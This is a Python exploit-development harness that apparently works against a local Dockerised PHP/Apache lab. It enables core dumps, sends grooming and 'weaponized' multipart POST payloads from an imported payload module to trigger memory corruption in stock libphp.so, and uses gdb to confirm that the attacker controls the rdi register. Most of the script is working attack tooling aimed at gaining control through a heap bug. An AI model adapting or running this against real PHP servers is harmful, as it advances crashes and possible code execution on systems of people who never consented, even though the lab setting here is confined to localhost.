#!/usr/bin/env python3
"""oom69: verify weaponized crash signature (rdi) from fresh cores.

Recipe: core env (ulimit + CoreDumpDirectory) -> restart -> warm ->
sacrifice -> 2 weaponized fires (target_obj=0x414141414141) ->
copy newest cores to phpbuild, gdb rdi. Expect 0x7a7a7a7a41414141
(stamp-tail 'zz' in bytes 6-7 + our AAAA low bytes) if value control
works; 0x4b4b4b4b... = walk landed on lead-in 'K's (boundary missed).
"""
import re
import subprocess
import time
import urllib.request

import payload68 as P

LAB = "http://127.0.0.1:8081"


def sh(cmd, timeout=60):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1", "replace").strip()


def post(att):
    req = urllib.request.Request(LAB + "/oom_mod.php", data=att,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return "200", r.read(120).decode("latin1", "replace")
    except Exception as e:
        return type(e).__name__, str(e)[:40]


def main():
    print("[0] stock md5 + core env", flush=True)
    md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, "stock gone: %s" % md5
    sh("grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars")
    sh("printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf")
    sh("rm -f /tmp/core*")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(30):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10):
            break
    print("    ready", flush=True)

    print("[1] recipe: warm -> sacrifice -> weaponized", flush=True)
    for k1 in P.K1S[:-1]:
        post(P.build_attack(k1, 6000000))
    code, _ = post(P.build_attack(3400, 6100000))
    print("    sacrifice:", code, flush=True)
    for fi in range(2):
        code, _ = post(P.build_attack(3400, 6200000 + fi * 100000,
                                      target_obj=0x414141414141))
        print("    wpn-fire%d: %s" % (fi, code), flush=True)
    time.sleep(3)

    print("[2] cores + gdb", flush=True)
    cores = sh("ls -t /tmp/core* 2>/dev/null").split()
    print("    cores:", cores, flush=True)
    for cn in cores[:2]:
        subprocess.run(["docker", "cp", "php_vuln:%s" % cn, "phpbuild:/tmp/core.69"],
                       capture_output=True)
        subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "cp /tmp/libphp.stock.so /tmp/libphp.69.so"], capture_output=True)
        gdbcmd = ("bt 4\\ninfo registers rdi rsi rip\\nx/4gx $rdi-16\\nquit\\n")
        subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "printf '%s' > /tmp/g69.gdb" % gdbcmd.replace("\n", "\\n")],
                       capture_output=True)
        out = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                              "gdb -q -batch -x /tmp/g69.gdb /tmp/libphp.69.so /tmp/core.69 2>&1 | tail -25"],
                             capture_output=True, timeout=120)
        print("--- %s ---" % cn)
        print(out.stdout.decode("latin1", "replace")[-1400:], flush=True)
        break  # first core enough

    print("[3] restore", flush=True)
    sh("rm -f /etc/apache2/conf-enabled/oomcore.conf")
    sh("sed -i '/ulimit -c/d' /etc/apache2/envvars")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    time.sleep(8)
    print("    restored:", sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10), flush=True)


if __name__ == "__main__":
    main()
